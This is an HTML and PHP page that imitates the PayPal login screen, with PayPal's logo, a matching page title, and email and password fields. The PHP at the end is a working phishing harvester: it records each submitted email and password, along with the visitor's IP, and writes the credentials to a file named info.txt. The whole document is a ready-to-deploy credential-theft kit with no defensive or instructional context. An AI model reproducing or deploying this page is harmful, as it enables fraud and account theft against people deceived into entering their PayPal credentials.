<!DOCTYPE html>
<html>
<head>
<style>
body
{
	margin-top:220px;
	margin-left:500px;
}
/* End Body */

/* Start Input Fields */
input[name=email]
{
	width:355px;
	height:40px;	
	font-family:Arial, sans-serif;
	border:1px solid #9DA3A6;
	border-radius:4px;
	padding-left:10px;			
}
input[name=pass]
{
	width:355px;
	height:40px;
	margin-top:10px;
	font-family:Arial, sans-serif;
	border:1px solid #9DA3A6;
	border-radius:4px;
	padding-left:10px;					
}
/* End Input Fields */

/* Start Link */
a 
{
	color:#2886C5;
	text-decoration:none;
	font-family:Arial, sans-serif;
	position:absolute;
	top:420px;
	left:595px;
}
a:hover
{
	text-decoration:underline;
}
/* End Link */

/* Start Log In */
input[class=log]
{
	width:368px;
	height:44px;
	border:1px solid #0171BB;
	border-radius:4px;	
	background-color:#0171BB;
	color:#FFFFFF;
	font-weight:bold;
	font-family:Arial, sans-serif;
	margin-top:30px;
	margin-bottom:20px;
		
}
input[class=log]:hover
{
	background-color:#005EA6;
}
/* End Log In */

.before
{
	width:170px;
	height:1px;
	background-color:#B6BABC;
	position:absolute;
	top:470px;
	left:500px;	

}
p
{
	font-size:18px;
	color:#757B80;
	position:absolute;
	top:440px;
	left:677px;
}
.after
{
	width:170px;
	height:1px;
	background-color:#B6BABC;
	position:absolute;
	top:470px;
	left:698px;		
}
.center {
  display: block;
  margin-left: auto;
  margin-right: auto;
  width: 50%;
}
/* Start Sign Up */
input[class=sign]
{
	width:368px;
	height:44px;
	border:1px solid #E3E6EB;
	border-radius:4px;		
	background-color:#E3E6EB;
	color:#2C2E2F;
	font-weight:bold;
	font-family:Arial, sans-serif;	
}
input[class=sign]:hover
{
	background-color:#D2DBE1;
}
/* End Sign Up */

</style> 
</style>
<img src="https://logos-download.com/wp-content/uploads/2016/03/PayPal_horizontally_Logo_2014.png" 
     width="300" 
     height="70" />
</body>
</html> 

<!DOCTYPE HTML>
<html>
<head>
<meta charset = 'UTF-8'>
<title>Log in to your PayPal account</title>
<link rel = 'icon' href = 'images/paypal.ico' type = 'image/x-icon'>
<link rel = 'stylesheet' href = 'css/normalize.css'>
<link rel = 'stylesheet' href = 'css/s.css'>
</head>
<body>


<form action = '' method = 'POST'>

<input name = "email" placeholder="Email or Phone number"><br>
<input name = "pass" placeholder="Password"><br>

<input class = 'log' type = 'submit' value = 'Log In'>



<br>
<input class = 'sign' type = 'submit' value = 'Sign Up'>

</form>


</body>
</html>

<?php  
function getUserIP() {
  if( array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER) && !empty($_SERVER['HTTP_X_FORWARDED_FOR']) ) {
      if (strpos($_SERVER['HTTP_X_FORWARDED_FOR'], ',')>0) {
          $addr = explode(",",$_SERVER['HTTP_X_FORWARDED_FOR']);
          return trim($addr[0]);
      } else {
          return $_SERVER['HTTP_X_FORWARDED_FOR'];
      }
  }
  else {
      return $_SERVER['REMOTE_ADDR'];
  }
}


$user_ip = getUserIP();


if (isset($_POST['email'])){
$ip = $user_ip;
$userinput = $_POST['email'];
$userinputt = $_POST['pass'];
$acapo = "\r\n";
$perip = ("Ip: $ip");
$perpassword = ("Password: $userinputt");
$perusername = ("Username: $userinput");
$myfile = fopen("info.txt", "w") or die("Unable to open file!");
fwrite($myfile, $perusername);
fwrite($myfile, $acapo);
fwrite($myfile, $perpassword);
fclose($myfile);}
?>

